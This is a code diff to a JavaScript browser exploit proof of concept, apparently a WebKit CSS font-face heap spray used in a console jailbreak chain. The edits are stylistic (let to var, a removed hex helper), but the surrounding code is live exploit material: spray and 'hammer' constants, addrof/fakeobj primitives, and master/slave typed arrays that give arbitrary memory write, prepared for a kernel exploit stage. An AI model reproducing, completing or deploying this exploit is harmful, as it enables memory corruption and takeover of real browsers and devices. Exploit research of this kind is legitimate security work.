@@ -2,18 +2,12 @@ var PAGE_SIZE = 16384;
 var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
-var SPRAY_FONTS = 0x100A;
+var SPRAY_FONTS = 0x100a;
 var GUESS_FONT = 0x200430000;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
 var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time
-
-function hex(n) {
-    if ((typeof n) != "number")
-        return "" + n;
-    return "0x" + (new Number(n)).toString(16);
-}
 
 function poc() {
 
@@ -387,10 +381,10 @@ function poc() {
     //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.
 
     //create compat stuff for kexploit.js
-    let expl_master = new Uint32Array(8);
-    let expl_slave = new Uint32Array(2);
-    let addrof_expl_slave = addrof(expl_slave);
-    let m = fakeobj(addrof(obj) + 16);
+    var expl_master = new Uint32Array(8);
+    var expl_slave = new Uint32Array(2);
+    var addrof_expl_slave = addrof(expl_slave);
+    var m = fakeobj(addrof(obj) + 16);
     obj.buffer = expl_slave;
     m[7] = 1;
     obj.buffer = expl_master;
@@ -398,7 +392,7 @@ function poc() {
     m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
     m[7] = 1;
 
-    let prim = {
+    var prim = {
         write8: function (addr, value) {
             expl_master[4] = addr.low;
             expl_master[5] = addr.hi;
@@ -422,7 +416,7 @@ function poc() {
         write2: function (addr, value) {
             expl_master[4] = addr.low;
             expl_master[5] = addr.hi;
-            let tmp = expl_slave[0] & 0xFFFF0000;
+            var tmp = expl_slave[0] & 0xFFFF0000;
             if (value instanceof int64) {
                 expl_slave[0] = ((value.low & 0xFFFF) | tmp);
             } else {
@@ -432,7 +426,7 @@ function poc() {
         write1: function (addr, value) {
             expl_master[4] = addr.low;
             expl_master[5] = addr.hi;
-            let tmp = expl_slave[0] & 0xFFFFFF00;
+            var tmp = expl_slave[0] & 0xFFFFFF00;
             if (value instanceof int64) {
                 expl_slave[0] = ((value.low & 0xFF) | tmp);
             } else {
